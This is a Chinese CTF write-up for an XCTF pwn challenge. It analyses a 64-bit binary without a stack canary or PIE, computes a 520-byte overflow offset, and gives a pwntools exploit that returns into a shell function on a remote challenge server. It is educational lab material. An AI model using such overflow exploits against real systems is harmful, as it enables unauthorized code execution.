---
title: xctf--pwn--反应釜开关控制
updated: 2022-09-14 01:57:20Z
created: 2022-09-06 06:47:13Z
---

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/513ca94d7d611e2b17e9dd4f3daa3617.png" alt="513ca94d7d611e2b17e9dd4f3daa3617.png" width="800" height="326" class="jop-noMdConv">

首先checksec查看保护

```zsh
└─# checksec ad72d90fbd4746ac8ea80041a1f661c2 
[*] '/root/xctf/ad72d90fbd4746ac8ea80041a1f661c2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

查看函数块

```zsh
└─#  objdump -t -j .text ad72d90fbd4746ac8ea80041a1f661c2 

ad72d90fbd4746ac8ea80041a1f661c2:     file format elf64-x86-64

SYMBOL TABLE:
0000000000400500 l    d  .text  0000000000000000              .text
0000000000400530 l     F .text  0000000000000000              deregister_tm_clones
0000000000400570 l     F .text  0000000000000000              register_tm_clones
00000000004005b0 l     F .text  0000000000000000              __do_global_dtors_aux
00000000004005d0 l     F .text  0000000000000000              frame_dummy
0000000000400870 g     F .text  0000000000000002              __libc_csu_fini
0000000000400800 g     F .text  0000000000000065              __libc_csu_init
0000000000400500 g     F .text  000000000000002a              _start
00000000004006b0 g     F .text  00000000000000a9              easy
0000000000400759 g     F .text  0000000000000099              main
0000000000400607 g     F .text  00000000000000a9              normal
00000000004005f6 g     F .text  0000000000000011              shell
```

**使用IDA对elf进行分析**

首先是main函数：

![0eb5670a12e1c2733c70eb9b5a164e8e.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/0eb5670a12e1c2733c70eb9b5a164e8e.png)

接下来是easy函数：

![da3dfb7e5b09ed18bd65af38ea6b163e.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/da3dfb7e5b09ed18bd65af38ea6b163e.png)

接下来是normal函数：

![df256bc5779d10128221d6ccbc563f3c.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/df256bc5779d10128221d6ccbc563f3c.png)

最后是shell函数，执行该函数可以获得一个shell

![cf93b03e8194163d13c97c8888fc28f6.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/cf93b03e8194163d13c97c8888fc28f6.png)

接下来进行分析

按照题目要求是从V5变量溢出至easy函数，再V2变量溢出至normal函数，最后再溢出至shell函数

但是由于该elf文件并未开启PIE保护（地址随机化），可以直接对main函数中的V5变量进行溢出至shell函数

可见分析中V5变量的偏移地址为 \[bp-200H\]，即为十进制的512,故而v5变量距栈底距离长度为512，还要加上8个长度以覆盖段基地址（64位为8个字节，32位为4个）

再分析查看shel函数的起始地址，可见为0X4005f6

```zsh
gdb-peda$ disass shell
Dump of assembler code for function shell:
   0x00000000004005f6 <+0>:     push   rbp
   0x00000000004005f7 <+1>:     mov    rbp,rsp
   0x00000000004005fa <+4>:     mov    edi,0x400888
   0x00000000004005ff <+9>:     call   0x4004b0 <system@plt>
   0x0000000000400604 <+14>:    nop
   0x0000000000400605 <+15>:    pop    rbp
   0x0000000000400606 <+16>:    ret    
End of assembler dump.
```

所以 padyload为`bytes('a',encoding='utf8')*520+shell_address`

exp如下：

```python
from pwn import *

key = p64(0x4005f6)

conn = remote('61.147.171.105',63873)

conn.recvuntil('>')

payload = bytes('a',encoding='utf8')*520+key

conn.sendline(payload)

conn.interactive()
```

运行结果如下，成功获取flag：

![10a593e92180a0f3f4e3a20d486de6ff.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/10a593e92180a0f3f4e3a20d486de6ff.png)